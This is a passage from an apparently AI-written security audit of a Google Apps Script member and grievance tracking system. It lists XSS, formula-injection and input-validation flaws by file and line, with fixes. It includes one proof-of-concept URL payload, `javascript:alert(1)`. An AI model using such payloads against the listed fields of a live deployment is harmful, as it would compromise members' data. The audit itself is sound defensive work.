**Severity:** HIGH | **Category:** XSS / Runtime Error | **File:** `03_UIComponents.gs` | **Lines:** 2455-2481

Quick Search uses `escapeHtml()` on line 2481 but never includes the function definition. Desktop Search (2384) and Advanced Search (2693) correctly include it via `${getClientSideEscapeHtml()}`.

**Fix:** Add `${getClientSideEscapeHtml()}` at the start of the `<script>` block.

---

### F111. Unescaped analytics data in Interactive Dashboard
**Severity:** CRITICAL | **Category:** XSS | **File:** `04c_InteractiveDashboard.gs` | **Lines:** 853, 871, 883, 912, 926, 945, 980

`renderAnalytics()` inserts `status.name`, `cat.name`, `loc.name`, `p.name`, `s.name`, `sec.name` into `innerHTML` without `escapeHtml()`. All are user-editable spreadsheet data.

**Fix:** Wrap all `.name` references in `escapeHtml()`.

---

### F112. Unescaped URLs in href in Interactive Dashboard renderResources
**Severity:** CRITICAL | **Category:** XSS | **File:** `04c_InteractiveDashboard.gs` | **Lines:** 1016-1029

URLs (`data.grievanceForm`, `data.orgWebsite`, `data.githubRepo`, etc.) inserted into `<a href>` without URL scheme validation or escaping. `javascript:alert(1)` in Config would execute.

**Fix:** Validate URL scheme + `escapeHtml()`.

---

### F113. Unescaped steward contact data in PublicDashboard
**Severity:** CRITICAL | **Category:** XSS | **File:** `04e_PublicDashboard.gs` | **Lines:** 2155-2163

`s.name`, `s.location`, `s.unit`, `s.email`, `s.phone`, and `loc` are injected into HTML, `onclick` handlers, `data-search` attributes, and `mailto:`/`tel:` links without escaping.

**Fix:** Use `escapeHtml()` for text content. Use `data-*` attributes with event delegation for onclick.

---

### F114. Unescaped onclick patterns in PublicDashboard
**Severity:** HIGH | **Category:** XSS | **File:** `04e_PublicDashboard.gs` | **Lines:** 2715, 2728, 2736, 2811, 2982, 3008, 3094

Server-provided IDs, labels, and keys injected into `onclick` handlers using `\\x27` pattern which only strips single quotes.

**Fix:** Use `data-*` attributes with event delegation.

---

### F115. CommandHub member search onclick injection
**Severity:** HIGH | **Category:** XSS | **File:** `11_CommandHub.gs` | **Line:** 1347

`id.replace(/'/g,"")` is insufficient for JS injection prevention (same pattern as F81/F82).

**Fix:** Use `data-id` attribute with event delegation.

---

### F116. Unescaped resource URLs in PublicDashboard
**Severity:** HIGH | **Category:** XSS | **File:** `04e_PublicDashboard.gs` | **Line:** 2148

Config-sourced `rl.customLink2Url` and `rl.customLink2Name` unescaped in href and text.

**Fix:** Validate URL scheme + `escapeHtml()`.

---

### F117. showMemberGrievanceHistory memberId unescaped — F92 partially reopened
**Severity:** MEDIUM | **Category:** XSS | **File:** `03_UIComponents.gs` | **Line:** 1952

Summary section: `'Member ID:</strong> ' + memberId` — unescaped.

**Fix:** `escapeHtml(memberId)`

---

### F118. Missing `escapeForFormula()` on 40+ `setValue()` calls
**Severity:** MEDIUM | **Category:** Formula Injection | **Scope:** Cross-cutting

Only 1 of 40+ user-data write paths uses `escapeForFormula()`:
- `02_DataManagers.gs:44-50` (addMember) — unprotected
- `02_DataManagers.gs:84-90` (updateMember) — unprotected
- `04c_InteractiveDashboard.gs:1757-1767` (saveInteractiveMember) — unprotected

**Fix:** Add `escapeForFormula()` to all user-data `setValue()` calls.

---

### F119. No input validation on saveInteractiveMember
**Severity:** HIGH | **Category:** Input Validation | **File:** `04c_InteractiveDashboard.gs` | **Lines:** 1702-1775

No server-side validation of email format, phone format, field lengths, or formula injection.

**Fix:** Add server-side validation for all fields.

---

### F120. quickUpdateGrievanceStatus — no row/status validation
**Severity:** HIGH | **Category:** Input Validation | **File:** `03_UIComponents.gs` | **Lines:** 1627-1637

No row bounds check or status whitelist validation. Can overwrite header row.

**Fix:** Validate `row >= 2 && row <= sheet.getLastRow()` and status against allowlist.

---

### F121. Missing empty-sheet guards in UIComponents (4 instances)
**Severity:** MEDIUM | **Category:** Empty Sheet Crash | **File:** `03_UIComponents.gs` | **Lines:** 1651, 1819, 1912, 1940

**Fix:** Add `if (sheet.getLastRow() <= 1) return;` guard.

---

### F122. emailDashboardLinkToMember URL parameter not encoded
**Severity:** MEDIUM | **Category:** Parameter Injection | **File:** `03_UIComponents.gs` | **Line:** 1775

**Fix:** Use `encodeURIComponent(memberId)`.

---

### F123. Unescaped export dialog values
**Severity:** MEDIUM | **Category:** XSS | **File:** `04b_AccessibilityFeatures.gs` | **Lines:** 740-741

**Fix:** Use `escapeHtml()` for `fileName`, `file.getDownloadUrl()`, `file.getUrl()`.

---

### F124. Unescaped steward dashboard URL
**Severity:** MEDIUM | **Category:** XSS | **File:** `04d_ExecutiveDashboard.gs` | **Lines:** 346-347

**Fix:** `escapeHtml(url)` for text content and href.

---

### F125. Unescaped error messages in AccessibilityFeatures import
**Severity:** MEDIUM | **Category:** XSS | **File:** `04b_AccessibilityFeatures.gs` | **Lines:** 539, 542

Error messages concatenated into `showStatus()` (which uses `innerHTML`) without `escapeHtml()`.

**Fix:** Wrap in `escapeHtml()`.

---

### F126. LockService confirmed in only 1 of 500+ mutations
**Severity:** HIGH | **Category:** Data Integrity | **Scope:** Cross-cutting

Only `generateChecklistId_()` (`12_Features.gs:114`) uses script locks. Confirms CC3 and F52.

**Fix:** Add `LockService.getScriptLock().waitLock(10000)` to critical mutation paths.

---

### F127. Multi-select callback function name injection
**Severity:** MEDIUM | **Category:** Code Injection | **File:** `04a_UIMenus.gs` | **Lines:** 665-708

`callback` parameter template-injected without validation.

**Fix:** Validate against whitelist of allowed function names.

---

### Cross-Cutting Verification Notes (2026-02-23)

**`getClientSideEscapeHtml()` — CRITICAL SYSTEMATIC BUG:** 15 of 21 non-comment inclusions use the broken string-literal pattern. **Highest priority fix.**

**`window.open()` — All Dynamic Instances Fixed:** F76, F77 confirmed fixed.

**`escapeForFormula()` — 1 of 40+ Write Paths Protected.**

**`LockService` — 1 of 500+ Mutation Functions Protected.**

**F23 Partially Reopened:** Email buttons at lines 1571-1573 missed in original fix.

**F92 Partially Reopened:** Summary section at line 1952 still unescaped.

**Existing Verified as Fixed:** F61 (EventBus error isolation), F62 (unsubscribe), F57 (partially — rate limiting present in MeetingCheckIn but needs SelfService verification).

---

### Updated Priority 1 — Fix Now (2026-02-23 New Findings)

| ID | Summary | Effort |
|----|---------|--------|
| **F109** | **FIX FIRST: Change 15 broken `getClientSideEscapeHtml()` string literals to bare function calls** | **Small** |
| F109a | Fix email buttons in `showGrievanceQuickActions()` lines 1571-1573 | Trivial |
| F110 | Add `getClientSideEscapeHtml()` to Quick Search dialog | Trivial |
| F111 | Escape analytics `.name` values in Interactive Dashboard | Small |
| F112 | Validate URL scheme + escape in `renderResources()` | Small |
| F113 | Escape steward contact data in PublicDashboard | Medium |
| F114 | Replace onclick injection with data attributes in PublicDashboard | Medium |
| F115 | Fix CommandHub member search onclick injection | Trivial |
| F116 | Escape resource URLs in PublicDashboard | Trivial |
| F119 | Add server-side validation to `saveInteractiveMember()` | Small |
| F120 | Validate row/status in `quickUpdateGrievanceStatus()` | Small |
| F126 | Add `LockService` to critical mutation paths | Medium |

---

*Updated 2026-02-23 by Claude Code (Opus 4.6) — thorough re-review with parallel agents and cross-cutting verification*
